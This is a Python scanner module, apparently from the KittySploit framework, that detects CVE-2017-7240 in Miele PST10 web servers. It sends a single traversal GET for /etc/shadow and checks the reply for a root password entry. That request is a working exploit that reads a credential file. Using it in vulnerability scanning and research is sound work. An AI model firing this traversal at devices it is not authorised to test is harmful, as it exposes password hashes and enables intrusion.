#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Miele Professional PG 8528 PST10 directory traversal (CVE-2017-7240)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Miele PST10 - Directory Traversal Detection (CVE-2017-7240)',
        'description': (
            'Detects CVE-2017-7240 on Miele PST10 WebServer by requesting '
            '/../../../../../../../../etc/shadow.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2017', 'miele', 'lfi', 'iot', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2017-7240',
        ],
        'cve': 'CVE-2017-7240',
    }

    def run(self):
        path = '/' + ('../' * 12) + 'etc/shadow'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        if re.search(r'root:.*:0:', r.text or ''):
            self.set_info(
                severity='high',
                reason='Miele PST10 path traversal (CVE-2017-7240)',
                path=path,
            )
            return True
        return False
